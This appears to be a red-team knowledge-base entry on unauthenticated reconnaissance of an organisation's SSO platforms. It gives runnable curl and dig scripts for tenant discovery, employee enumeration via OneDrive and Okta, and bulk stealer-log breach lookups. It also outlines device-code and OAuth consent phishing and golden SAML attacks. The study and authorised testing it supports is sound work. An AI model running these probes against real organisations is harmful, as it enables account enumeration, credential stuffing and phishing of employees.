---
title: "Identity Fabric Enumeration"
type: technique
tags: [active-directory, azure, enumeration, git-poc, m365, oauth, okta, osint, recon, saml]
phase: recon
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [git-claude-osint, 0xdf-specialty-web]
---

# Identity Fabric Enumeration

## What It Is

**Identity fabric enumeration** maps an organisation's SSO/IdP infrastructure from the outside — without authentication. The goal is to identify which identity platform the target uses (Entra, Okta, ADFS, Google Workspace, etc.), extract tenant identifiers, enumerate email users, and correlate with breach data to produce an `SSO_EXPOSURE` finding. Compromise the identity layer and you don't need to break into individual apps.

See also: [[cloud-iam-attacks]], [[authentication-attacks]], [[secret-hunting]]

---

## How It Works

Every major IdP exposes unauthenticated discovery endpoints: OIDC `.well-known` metadata, federation service endpoints, and tenant-specific login flows. These return tenant GUIDs, federation metadata, and authentication posture details that are designed for machine consumption during SSO setup — and are equally useful for recon.

---

## Attack Phases

- **Recon** — primary phase; all techniques here are passive to medium-detectability
- **Exploitation** — findings feed phishing, device-code phishing, and credential-stuffing attacks

---

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Target domain | Known seed domain (e.g., `target.com`) |
| Email list | Harvested employee emails (feed from Hunter.io / IntelX / crt.sh SANs) |
| Authorization | Authorized engagement (bug bounty scope, red team ROE) |

---

## Methodology

### Step 1 — Confirm Microsoft 365 / Entra Tenancy

```bash
T="target.com"

# OIDC metadata → extracts tenant GUID
curl -sk "https://login.microsoftonline.com/${T}/.well-known/openid-configuration" \
  | jq -r '.issuer'
# Output: https://login.microsoftonline.com/<GUID>/v2.0

# Pull just the GUID
TENANT=$(curl -sk "https://login.microsoftonline.com/${T}/.well-known/openid-configuration" \
  | jq -r '.issuer' \
  | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}')
echo "Tenant GUID: $TENANT"

# Confirm M365 via MX record
dig +short MX $T
# If *.mail.protection.outlook.com → M365 confirmed

# Federation status (Managed vs Federated IdP)
curl -sk "https://login.microsoftonline.com/getuserrealm.srf?login=admin@${T}" | jq .
# NameSpaceType: "Managed"  → Entra is the IdP
# NameSpaceType: "Federated" → upstream ADFS or external IdP; check AuthURL field
```

**Detectability:** Low — OIDC metadata fetch does not trigger sign-in events.

### Step 2 — M365 Deep Enumeration

```bash
STEM="acme"   # company name (tenant stem; often company name without TLD)

# SharePoint subdomain presence
for sub in "" "-my" "-admin"; do
  HOST="${STEM}${sub}.sharepoint.com"
  STATUS=$(curl -sk -m 10 -I "https://${HOST}/" -w '%{http_code}' -o /dev/null)
  echo "$HOST → $STATUS"
done
# 200/302 = tenant exists; 404 = not provisioned with that stem

# OneDrive personal-site user enumeration (per harvested email)
for email in alice@${T} bob@${T}; do
  TOKEN=$(echo "$email" | tr '@.' '_')
  URL="https://${STEM}-my.sharepoint.com/personal/${TOKEN}/Documents/"
  STATUS=$(curl -sk -m 10 -I "$URL" -w '%{http_code}' -o /dev/null)
  echo "$email → $STATUS"
  # 401 = user exists + OneDrive provisioned; 404 = user absent or OneDrive disabled
done

# Device-code phishing posture
curl -sk "https://login.microsoftonline.com/${T}/v2.0/.well-known/openid-configuration" \
  | jq '.device_authorization_endpoint'
# Non-null + no Conditional Access restriction → device-code phishing feasible (MEDIUM finding)

# Autodiscover confirmation (passive M365 confirm even when MX wrapped by Mimecast)
curl -sk -m 10 -I "https://autodiscover.${T}/autodiscover/autodiscover.json" -w '%{http_code}\n'
dig +short A autodiscover.${T}
# Microsoft IP → M365 even when MX shows Mimecast/Proofpoint

# Dynamics / Power Platform presence
for region in crm crm2 crm3 crm4 crm5 crm6 crm7 crm8 crm9 crm10; do
  HOST="${STEM}.${region}.dynamics.com"
  IP=$(dig +short A $HOST | head -1)
  [ -n "$IP" ] && echo "Dynamics: $HOST → $IP"
done

# OAuth client_id extraction from target JS bundles
for js in $(curl -sk "https://app.${T}/" | grep -oE 'src="[^"]*\.js"' | tr -d '"' | sed 's/src=//'); do
  curl -sk "https://app.${T}/$js" 2>/dev/null \
    | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
    | sort -u
done | tee m365-clientids.txt
```

### Step 3 — Okta Tenant Discovery

```bash
# Okta tenant slug pattern: <slug>.okta.com or <slug>.oktapreview.com (staging)
for slug in ${STEM} ${STEM}-dev ${STEM}-staging ${STEM}-prod; do
  STATUS=$(curl -sk -m 10 -I "https://${slug}.okta.com/.well-known/okta-organization" \
    -w '%{http_code}' -o /dev/null)
  [ "$STATUS" = "200" ] && echo "Okta tenant found: ${slug}.okta.com"
done

# Okta user enumeration via /api/v1/authn (medium detectability — rate-limited)
curl -sk -X POST "https://${STEM}.okta.com/api/v1/authn" \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice@target.com","password":"wrongpassword"}' | jq .
# "FACTOR_CHALLENGE" or "SUCCESS" → user exists
# "AUTHENTICATION_FAILED" or specific error → check error code to confirm enum
```

**Detectability:** Medium — Okta logs all `/api/v1/authn` requests.

### Step 4 — ADFS Fingerprinting

```bash
# MEX endpoint (reveals ADFS version + federation metadata)
curl -sk "https://adfs.${T}/adfs/services/trust/mex" | head -50

# Federation metadata (reveals signing certs + endpoints)
curl -sk "https://adfs.${T}/FederationMetadata/2007-06/FederationMetadata.xml" | head -100

# ADFS login page fingerprint
curl -sk -I "https://adfs.${T}/adfs/ls/?" -w '%{http_code}\n'

# Check standard SAML metadata paths (5 paths)
for path in /saml/metadata \
            /FederationMetadata/2007-06/FederationMetadata.xml \
            /federationmetadata/2007-06/federationmetadata.xml \
            /simplesaml/saml2/idp/metadata.php \
            /auth/saml2/metadata; do
  STATUS=$(curl -sk -m 10 -I "https://${T}${path}" -w '%{http_code}' -o /dev/null)
  [ "$STATUS" = "200" ] && echo "SAML metadata: ${T}${path}"
done
```

### Step 5 — Google Workspace Discovery

```bash
# OIDC discovery
curl -sk "https://accounts.google.com/.well-known/openid-configuration" | jq .

# MX record → confirm Google Workspace
dig +short MX $T
# aspmx.l.google.com → Google Workspace confirmed

# TXT record verification token (reveals SaaS tenancy)
dig TXT $T | grep -E 'google-site-verification|MS=ms|cisco-ci-domain'
```

### Step 6 — SSO Subdomain Probing

Probe each prefix across the root domain and any sibling brand domains:

```bash
for prefix in auth login sso idp iam identity accounts oauth; do
  HOST="${prefix}.${T}"
  STATUS=$(curl -sk -m 10 -I "https://${HOST}/" -w '%{http_code}' -o /dev/null)
  [ "$STATUS" != "000" ] && echo "$HOST → $STATUS"
  # Also probe /.well-known/openid-configuration on every hit
  OID=$(curl -sk -m 10 "https://${HOST}/.well-known/openid-configuration" | jq -r '.issuer // empty')
  [ -n "$OID" ] && echo "  OIDC issuer: $OID"
done
```

### Step 7 — Breach × Identity Correlation (SSO_EXPOSURE)

```bash
# HudsonRock Cavalier — free, unauthenticated, highest single-source ROI
# By domain
curl -sk -m 30 "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=${T}" | jq .

# By email (batch all harvested emails)
for email in $(cat employee-emails.txt); do
  curl -sk -m 30 "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email=$email" \
    | jq --arg e "$email" -c '{email: $e, total: .total_corporate_services, stealers: .stealers}'
  sleep 1   # 1 req/sec rate limit
done | tee hudsonrock-by-email.jsonl

# Count compromised employees
grep -c '"total":[1-9]' hudsonrock-by-email.jsonl
```

**Severity mapping (SSO_EXPOSURE finding):**

| HudsonRock employee count | Severity |
|--------------------------|----------|
| ≥ 10 employees in stealer corpus | **CRITICAL** |
| 1–9 employees | **HIGH** |
| ≥ 1 end-user (customer) | **MEDIUM** |
| 0 | INFO |

**Legacy-mail-decommissioned escalation:** If `mail.<target>` → NXDOMAIN today but stealer logs show employee credentials against it historically, AND current MX → M365/Google Workspace, employees almost certainly reused passwords after the migration → escalate to **CRITICAL** even when the legacy host is gone.

---

## Key Payloads / Examples

### Entra tenant GUID extraction (one-liner)

```bash
curl -sk "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" \
  | grep -oP '"issuer":"https://login\.microsoftonline\.com/\K[^/]+'
```

### Full identity fabric sweep (bash loop)

```bash
T="target.com"; STEM="targetco"

echo "=== Entra ===" && \
  curl -sk "https://login.microsoftonline.com/${T}/.well-known/openid-configuration" | jq '{issuer, authorization_endpoint}' && \
  curl -sk "https://login.microsoftonline.com/getuserrealm.srf?login=admin@${T}" | jq '{NameSpaceType, FederationBrandName}'

echo "=== MX ===" && dig +short MX $T

echo "=== SharePoint ===" && \
  for s in "" "-my" "-admin"; do
    curl -sk -m 10 -I "https://${STEM}${s}.sharepoint.com/" -w "${STEM}${s}.sharepoint.com → %{http_code}\n" -o /dev/null
  done

echo "=== SSO subdomains ===" && \
  for p in auth login sso idp iam identity accounts oauth; do
    curl -sk -m 5 -I "https://${p}.${T}/" -w "${p}.${T} → %{http_code}\n" -o /dev/null
  done

echo "=== SAML ===" && \
  curl -sk -m 10 -I "https://${T}/FederationMetadata/2007-06/FederationMetadata.xml" -w '%{http_code}\n' -o /dev/null

echo "=== HudsonRock ===" && \
  curl -sk "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=${T}" \
  | jq '{employees, users, third_parties, total}'
```

---

## Bypasses and Variants

### Teams Federation open → phishing pivot

If `getuserrealm.srf` confirms M365 and Teams federation is **unrestricted** (default), any external M365 tenant can send Teams messages to target employees — low-noise IT-pretext phishing surface. Finding: **MEDIUM**.

### Device-code phishing

If the device-code authorization endpoint is active and no Conditional Access restricts it:
1. Attacker runs: `az login --use-device-code` (or equivalent)
2. Sends the generated URL + code to the victim via Teams/email
3. Victim clicks, enters code → attacker receives access token for the victim's account

### OAuth client_id abuse

Discovered client_ids from JS bundles can be used to craft OAuth consent phishing flows requesting high-privilege Graph scopes.

### From the Wild — on-prem federation pivot (HTB, `0xdf-specialty-web`)

**Ghost** progresses from phishing-resistant Windows privesc motifs into federation compromise: escalate to **`adfs_gmsa$`**, harvest **ADFSSigningCertificate** material, then mint **golden SAML assertions** usable against **`/adfs/`** endpoints that front SSO-authenticated portals.

**Cerberus** mirrors how enterprise appliances ship **plaintext SAML federation metadata**. When `ISSUER_URL=http://dc.cerberus.local/adfs/services/trust` satisfies an exploitable SSO handler (documented externally for CVE-2022-47966 workflows), chaining becomes configuration-driven rather than pure AD compass work.

Operational lesson: fingerprint **`/adfs/ls/`** flows early, correlate **PKI material** on disk, and hunt **plaintext IdP issuer strings** bundled with SSO-integrated appliances (see [[adcs]], [[evil-winrm]] for adjacent Windows tooling contexts).

---

## Detection and Defence

| Control | Detects |
|---------|---------|
| Entra Sign-in Logs | Unusual user enumeration patterns from `GetCredentialType` |
| Okta System Log | All `/api/v1/authn` requests (including failed) |
| HudsonRock / HIBP monitoring | Org-wide stealer exposure alerts |
| Conditional Access | Block device-code flow per app or per network |
| Disable Teams external federation or restrict to named tenants | Blocks Teams phishing |
| MFA enforcement | Even with stolen password, SSO_EXPOSURE impact is reduced |

---

## Tools

| Tool | Purpose |
|------|---------|
| `curl` + `jq` | OIDC/federation endpoint probing |
| [HudsonRock Cavalier](https://cavalier.hudsonrock.com/) | Free infostealer breach lookup |
| [Hunter.io](https://hunter.io/) | Email harvest for breach correlation input |
| [AADInternals](https://github.com/Gerenios/AADInternals) | Deep Entra/M365 enumeration (PS module) |
| [o365creeper](https://github.com/LMGsec/o365creeper) | M365 email validation |
| [Subfinder](https://github.com/projectdiscovery/subfinder) | Subdomain enum for SSO prefix discovery |

---

## Sources

- `raw/git/Claude-OSINT/` — ElementalSoul claude-osint skills v2.1 (osint-methodology §11, offensive-osint §22)
- `0xdf-specialty-web`: Ghost (`adfs_gmsa` → Golden SAML), Cerberus (ADFS issuer metadata for SAML RCE prerequisites)
